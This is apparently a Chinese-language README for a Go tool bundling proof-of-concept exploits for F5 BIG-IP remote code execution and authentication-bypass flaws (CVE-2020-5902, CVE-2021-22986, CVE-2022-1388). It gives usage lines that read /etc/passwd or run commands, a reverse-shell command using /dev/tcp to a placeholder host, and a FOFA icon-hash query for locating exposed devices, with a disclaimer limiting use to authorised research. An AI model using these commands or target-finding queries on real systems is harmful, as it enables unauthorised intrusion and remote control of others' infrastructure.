# F5-BIG-IP POC

go语言编写CVE-2020-5902 CVE-2021-22986 CVE-2022-1388 POC集合 后续会增加F5其他POC

author:160team.west9B

**仅限用于安全研究人员在授权的情况下使用，遵守网络安全法，产生任何问题，后果自负，与作者无关。**

# 01-基本介绍

F5 POC合集：

CVE-2020-5902：F5 BIG-IP远程代码执行漏洞

CVE-2021-22986：F5 BIG-IP iControl REST未授权远程命令执行漏洞

CVE-2022-1388：身份验证绕过远程命令执行



# 02-使用说明

## usage: ./F5-BIG-IP  -u url 

CVE-2020-5902验证使用任意文件下载，返回/etc/passwd 则漏洞存在

CVE-2021-22986，CVE-2022-1388 POC默认执行id命令，返回{id}则漏洞存在，可使用-c自定义命令

## 反弹shell

usage: ./cve-2022-30525.exe -m exp -u url -c bash -i >& /dev/tcp/xxxx/1377 0>&1

# Screenshots
![Image text](https://github.com/west9b/F5-BIG-IP-POC/blob/main/poc.png)
![Image text](https://github.com/west9b/F5-BIG-IP-POC/blob/main/poc1.png)
# fofa
icon_hash="-335242539"
